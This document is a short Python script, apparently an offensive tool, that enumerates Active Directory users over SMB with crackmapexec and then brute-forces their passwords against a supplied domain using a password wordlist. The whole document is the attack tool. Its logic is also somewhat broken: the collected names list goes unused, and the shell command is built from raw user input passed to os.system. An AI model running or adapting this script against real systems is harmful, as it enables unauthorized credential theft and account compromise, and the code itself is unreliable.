import os
import subprocess

names = []

open_file = input("what file are you scanning: ")
domain = str(input("what domain are you finding users for: "))
bruteforce = str(input("what file are you using for password brutforcing: "))
print("finding users . . . ")

with open (open_file,'r') as file:
	for line in file:
		first, last = line.strip().split(',')
		names.append(first + last)

def get_data():
	keep = []
	burn = []

	#init crackmapexec
	crackmapexec = [
		"crackmapexec",
		"smb",
		domain,
		"-u",
		f"{first}.{last}",
		 "--users"
		]
	completed_process = subprocess.run(crackmapexec, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
	output = completed_process.stdout
	print(output)

	# Split the output into lines
	output_lines = output.split('\n')
	if output_lines:
		last_line = output_lines[-2]
	keep = last_line.strip().split("\\")
	keep = keep[-1]
	usernameL = keep.strip().split("  ")
	username = usernameL[0]
	#username, password = keep.strip().slpit(':')
	print("username: ")
	print(username)
	print("getting user password ")
	brute = (f"crackmapexec smb {domain} -u {username} -p {bruteforce} | grep +")
	os.system(brute)



get_data()

